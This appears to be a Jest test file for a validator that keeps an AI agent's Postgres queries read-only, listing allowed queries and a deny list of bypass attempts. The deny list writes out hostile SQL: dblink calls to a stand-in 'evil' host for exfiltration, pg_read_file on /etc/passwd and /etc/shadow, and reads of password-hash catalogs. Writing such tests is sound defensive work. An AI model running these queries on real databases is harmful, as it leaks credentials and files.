import {
  SHOW_SENSITIVE_PARAMS,
  stripComments,
  validateReadOnlySql,
} from './sql-validator';

const limits = { maxSqlLength: 8192 };

describe('stripComments', () => {
  it('removes line and block comments', () => {
    expect(stripComments('SELECT 1 -- trailing')).toMatch(/SELECT 1/);
    expect(stripComments('SELECT /* block */ 1')).toMatch(/SELECT\s+1/);
  });
});

describe('validateReadOnlySql', () => {
  const allow = [
    'SELECT 1',
    'select * from users limit 10',
    'WITH t AS (SELECT 1) SELECT * FROM t',
    'EXPLAIN SELECT 1',
    'SHOW TIMEZONE',
    '  SELECT 1  ;',
    // SHOW of non-sensitive server parameters stays allowed.
    'SHOW search_path',
    'SHOW statement_timeout',
    'SHOW server_version',
    // Schema-introspection paths the agent legitimately uses MUST keep working.
    'SELECT * FROM information_schema.columns WHERE table_name = $1',
    'SELECT * FROM pg_catalog.pg_class',
    'SELECT * FROM pg_catalog.pg_namespace',
    // Column identifiers that contain a denylisted catalog name as a SUBSTRING
    // must not false-positive (e.g. an audit table column called pg_user_id).
    'SELECT last_pg_user_id FROM audit_log',
    'SELECT pg_shadow_setting FROM tenant_config',
  ];

  const deny: Array<[string, RegExp]> = [
    ['INSERT INTO users (id) VALUES (1)', /dangerous keyword/i],
    ['UPDATE users SET x=1', /dangerous keyword/i],
    ['DELETE FROM users', /dangerous keyword/i],
    ['DROP TABLE users', /dangerous keyword/i],
    ['ALTER TABLE users ADD COLUMN x int', /dangerous keyword/i],
    ['CREATE TABLE t (id int)', /dangerous keyword/i],
    ['TRUNCATE users', /dangerous keyword/i],
    ['GRANT SELECT ON users TO public', /dangerous keyword/i],
    ['COPY users FROM stdin', /dangerous keyword/i],
    ['VACUUM users', /dangerous keyword/i],
    ['SELECT pg_sleep(1)', /dangerous keyword/i],
    ['SELECT pg_terminate_backend(1)', /dangerous keyword/i],
    ['SELECT 1; SELECT 2', /multiple statements/i],
    ['DO $$ BEGIN END $$', /DO blocks|only SELECT/i],
    ['SET search_path = public', /only SELECT|SET/i],
    [
      'WITH writer AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM writer',
      /CTE containing a write|dangerous keyword/i,
    ],
    ['', /empty sql/i],
    // C2: validator gaps
    // SELECT col INTO new_table FROM old_table is Postgres "CREATE TABLE AS"
    // semantics — writes. No INSERT/CREATE keyword appears textually so the
    // word-list didn't catch it.
    [
      'SELECT id INTO new_users FROM users',
      /SELECT INTO is not allowed|dangerous keyword/i,
    ],
    [
      'SELECT * INTO new_users FROM users WHERE x=1',
      /SELECT INTO is not allowed|dangerous keyword/i,
    ],
    // dblink / dblink_exec — outbound exfil from inside Postgres
    [
      "SELECT * FROM dblink('host=evil port=5432 user=foo','SELECT 1') AS t(x int)",
      /dangerous keyword/i,
    ],
    [
      "SELECT dblink_exec('host=evil','INSERT INTO target VALUES (1)')",
      /dangerous keyword/i,
    ],
    // pg_read_file / pg_read_binary_file — filesystem read via superuser/role
    ["SELECT pg_read_file('/etc/passwd')", /dangerous keyword/i],
    ["SELECT pg_read_binary_file('/etc/shadow')", /dangerous keyword/i],
    // lo_import / lo_export — large-object filesystem I/O
    ["SELECT lo_import('/tmp/x')", /dangerous keyword/i],
    ["SELECT lo_export(1234,'/tmp/x')", /dangerous keyword/i],
    // Security HIGH-1: set_config bypassed the SET regex because `_` is a
    // word-char, so `\bSET\b` doesn't match in `set_config`. Now in deny-words.
    [
      "SELECT set_config('statement_timeout', '0', false)",
      /dangerous keyword/i,
    ],
    // Security HIGH-2: lock-contention DoS surface
    ['SELECT pg_advisory_lock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_xact_lock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_unlock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_unlock_all()', /dangerous keyword/i],
    // Security HIGH-2: schema-size info leak (bypasses allowed_tables)
    ["SELECT pg_relation_size('secret_audit')", /dangerous keyword/i],
    ["SELECT pg_total_relation_size('secret_audit')", /dangerous keyword/i],
    ["SELECT pg_database_size('app')", /dangerous keyword/i],
    ["SELECT pg_tablespace_size('pg_default')", /dangerous keyword/i],
    // Security HIGH-2: FDW config leak
    ['SELECT * FROM postgres_fdw_get_connections()', /dangerous keyword/i],
    ["SELECT postgres_fdw_disconnect('srv')", /dangerous keyword/i],
    ['SELECT postgres_fdw_disconnect_all()', /dangerous keyword/i],
    // Security HIGH-2: WAL pollution (writes even under RO transaction)
    [
      "SELECT pg_logical_emit_message(true, 'tag', 'payload')",
      /dangerous keyword/i,
    ],
    // Security defense-in-depth: session-GUC introspection
    ["SELECT current_setting('app.tenant_id')", /dangerous keyword/i],
    // ── App-instance metadata-leak vectors (Slice 1 of Layer-C removal) ──
    // System catalogs that leak app-DB role names, password hashes, sessions,
    // server config, and auth-file paths when the agent dials the same
    // Postgres INSTANCE as the application. Adding these to Layer A closes
    // the gap before Layer C (the host+port guard) is removed in Slice 2.
    ['SELECT * FROM pg_shadow', /dangerous keyword/i],
    ['SELECT * FROM pg_authid', /dangerous keyword/i],
    ['SELECT rolname FROM pg_roles', /dangerous keyword/i],
    ['SELECT * FROM pg_user', /dangerous keyword/i],
    ['SELECT * FROM pg_stat_activity', /dangerous keyword/i],
    ['SELECT * FROM pg_stat_replication', /dangerous keyword/i],
    ['SELECT name, setting FROM pg_settings LIMIT 5', /dangerous keyword/i],
    ['SELECT * FROM pg_hba_file_rules', /dangerous keyword/i],
    ['SELECT * FROM pg_file_settings', /dangerous keyword/i],
    // Replication / publication / subscription catalogs (security MED #1).
    ['SELECT * FROM pg_replication_slots', /dangerous keyword/i],
    ['SELECT * FROM pg_subscription', /dangerous keyword/i],
    ['SELECT * FROM pg_publication', /dangerous keyword/i],
    // Function-form bypasses (security MED #3). `pg_stat_activity` is a view
    // over `pg_stat_get_activity()`; blocking only the view leaves a hole.
    ['SELECT * FROM pg_stat_get_activity(NULL)', /dangerous keyword/i],
    ['SELECT * FROM pg_show_all_settings()', /dangerous keyword/i],
    ['SELECT * FROM pg_show_all_file_settings()', /dangerous keyword/i],
    // Schema-qualified, quoted, and case variants of the catalog reads.
    ['SELECT * FROM pg_catalog.pg_shadow', /dangerous keyword/i],
    ['SELECT * FROM "pg_shadow"', /dangerous keyword/i],
    ['select * from PG_SHADOW', /dangerous keyword/i],
    // SHOW ALL dumps every GUC including the sensitive ones — trivial
    // bypass of an explicit-param denylist if not handled (QA HIGH #1).
    ['SHOW ALL', /sensitive server parameter/i],
    ['show all', /sensitive server parameter/i],
    // Whitespace / tab / case variants on the SHOW guard.
    ['SHOW  data_directory', /sensitive server parameter/i],
    ['SHOW\tdata_directory', /sensitive server parameter/i],
    ['show DATA_DIRECTORY', /sensitive server parameter/i],
  ];

  for (const sql of allow) {
    it(`allows: ${sql}`, () => {
      const verdict = validateReadOnlySql(sql, limits);
      expect(verdict.ok).toBe(true);
    });
  }

  for (const [sql, reason] of deny) {
    it(`denies: ${sql}`, () => {
      const verdict = validateReadOnlySql(sql, limits);
      expect(verdict.ok).toBe(false);
      if (verdict.ok === false) {
        expect(verdict.reason).toMatch(reason);
      }
    });
  }

  it('rejects oversized sql', () => {
    const huge = 'SELECT ' + '1,'.repeat(5000) + '1';
    const verdict = validateReadOnlySql(huge, { maxSqlLength: 100 });
    expect(verdict.ok).toBe(false);
    if (verdict.ok === false) expect(verdict.reason).toMatch(/max length/);
  });

  it('allows SET LOCAL (transaction-scoped only)', () => {
    // SET LOCAL is explicitly allowed in the SET regex, but the statement must
    // still start with SELECT/WITH/SHOW/EXPLAIN — so SET LOCAL alone is denied
    // at the "allowed start" gate, which is correct for read-only user input.
    const verdict = validateReadOnlySql('SET LOCAL statement_timeout=1', limits);
    expect(verdict.ok).toBe(false);
  });

  // QA MED #2: enumerate every sensitive SHOW parameter so a future refactor
  // that drops one from the regex fails loudly. The exported constant IS the
  // contract; the spec proves each entry is enforced.
  describe('SHOW_SENSITIVE_PARAMS contract', () => {
    for (const param of SHOW_SENSITIVE_PARAMS) {
      it(`denies SHOW ${param}`, () => {
        const verdict = validateReadOnlySql(`SHOW ${param}`, limits);
        expect(verdict.ok).toBe(false);
        if (verdict.ok === false) {
          expect(verdict.reason).toMatch(/sensitive server parameter/i);
        }
      });
    }
  });

  // QA #3 (LOW, kept as a seat-belt): the `\b`-anchored denylist intentionally
  // over-blocks catalog names that appear inside string literals — consistent
  // with how CURRENT_SETTING / SET_CONFIG already behave. Pin the behavior so
  // a future maintainer doesn't "fix" the false positive without weighing the
  // bypass risk (LLM-emitted string literals containing catalog names).
  it("over-blocks pg_shadow inside a string literal (documented tradeoff)", () => {
    const verdict = validateReadOnlySql(
      "SELECT 'pg_shadow info' AS topic",
      limits,
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok === false) {
      expect(verdict.reason).toMatch(/dangerous keyword/i);
    }
  });
});
